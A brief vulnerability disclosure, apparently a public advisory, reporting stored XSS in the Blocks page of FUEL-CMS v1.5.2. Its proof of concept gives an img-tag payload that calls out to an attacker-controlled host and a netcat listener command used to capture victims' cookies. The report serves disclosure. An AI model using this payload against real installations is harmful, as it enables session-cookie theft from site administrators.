# Stored XSS vulnerability in FUEL-CMS v1.5.2 of the page Blocks

**vender**:

- [daylightstudio/FUEL-CMS: A CodeIgniter Content Management System](https://github.com/daylightstudio/FUEL-CMS)

**SoftLink**:

- [Release 1.5.2 · daylightstudio/FUEL-CMS](https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.5.2)

**Vulnerable Page**

- Blocks

**Version**

- v 1.5.2

### POC 

Click **Blocks**, then click **Create**. In the **View** field, enter the payload:

```html
<img src="http://vps:2333" alt="dune">
```

Click **Preview** to trigger the XSS.

![image-20250818212900222](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182129363.png)



![image-20250818212920001](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182129126.png)

在vps上`nc -lvnp 2333`，可以获得cookie

![image-20250818212929771](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508182129848.png)